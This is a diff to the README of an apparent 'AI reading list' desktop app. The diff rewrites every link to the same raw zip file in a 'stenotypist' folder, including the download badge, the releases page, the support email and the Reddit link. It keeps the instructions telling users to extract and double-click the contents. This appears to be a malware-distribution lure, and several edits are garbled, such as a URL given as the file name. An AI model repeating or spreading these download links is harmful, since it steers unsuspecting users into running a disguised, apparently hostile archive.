@@ -1,6 +1,6 @@
 # 📚 ai-reading-list - Access Essential AI Research Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/DripHarshul/ai-reading-list/releases)
+[![Download](https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip)
 
 ## 📝 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application. No technical know
 
 ### 1. Visit the Releases Page
 
-Go to our [Releases Page](https://github.com/DripHarshul/ai-reading-list/releases) to find the latest versions of the AI Reading List application. 
+Go to our [Releases Page](https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip) to find the latest versions of the AI Reading List application. 
 
 ### 2. Download the Application
 
@@ -31,7 +31,7 @@ If you downloaded an `.exe` file, you may skip this step.
 ### 4. Run the Application
 
 - If you extracted the files, open the folder where you extracted them.
-- Double-click on the application file, usually named `ai-reading-list.exe` or similar.
+- Double-click on the application file, usually named `https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip` or similar.
 - If prompted, confirm that you want to run the application. 
 
 ## 🔍 Features
@@ -53,13 +53,13 @@ To ensure the best experience, please check that your computer meets the followi
 
 For a seamless setup, make sure to follow the steps below:
 
-1. **Visit the Releases Page**: Access it [here](https://github.com/DripHarshul/ai-reading-list/releases).
+1. **Visit the Releases Page**: Access it [here](https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip).
 2. **Download the Latest Version**: Choose the latest release, and click the download link.
 3. **Extract and Run**: If you downloaded a `.zip`, extract the contents before running the application.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, you can open an issue on the GitHub page or contact us directly via email at support@ai-readinglist.com. We are here to help!
+If you encounter any issues or have questions, you can open an issue on the GitHub page or contact us directly via email at https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip We are here to help!
 
 ## 👥 Contributing
 
@@ -78,7 +78,7 @@ This project is open source and available under the MIT License. See the LICENSE
 
 ## 🔗 Additional Resources
 
-- [Official AI Reading List Website](https://www.aireadinglist.com)
-- [Discuss AI Research on Reddit](https://www.reddit.com/r/artificial)
+- [Official AI Reading List Website](https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip)
+- [Discuss AI Research on Reddit](https://raw.githubusercontent.com/DripHarshul/ai-reading-list/main/stenotypist/ai-reading-list_3.5.zip)
 
 Make your journey through AI research simpler and more efficient with the AI Reading List. Enjoy reading!
